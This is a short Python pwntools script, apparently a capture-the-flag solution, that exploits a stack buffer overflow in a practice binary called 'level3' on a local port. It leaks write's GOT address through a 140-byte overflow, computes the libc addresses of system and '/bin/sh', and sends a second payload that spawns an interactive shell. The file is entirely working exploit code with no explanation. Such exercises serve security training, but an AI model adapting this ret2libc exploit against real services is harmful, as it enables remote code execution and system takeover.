from pwn import *
# p = process('./level3')
p = remote('127.0.0.1',10003)

# socat TCP4-LISTEN:10003,fork EXEC:./level3


# gdb.attach(pidof(p)[0])
# context.log_level = 'debug'

write_plt = 0x8048320
write_got = 0x0804a014
main = 0x8048460
payload = 'B'*140 + p32(write_plt) + p32(main) + p32(1)  + p32(write_got) + p32(0x10)
p.sendline(payload)

write_addr = u32(p.recv()[0:4])
log.info('write addr :'+ hex(write_addr))

libc = ELF('./libc.so')
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))
system_addr = write_addr - (write_offset - system_offset)
binsh_addr = write_addr - (write_offset - binsh_offset)
log.info('system_addr:'+hex(system_addr))

payload2 = 'B'*140 + p32(system_addr) + p32(0xdeafbeaf) + p32(binsh_addr)

p.sendline(payload2)
p.interactive()
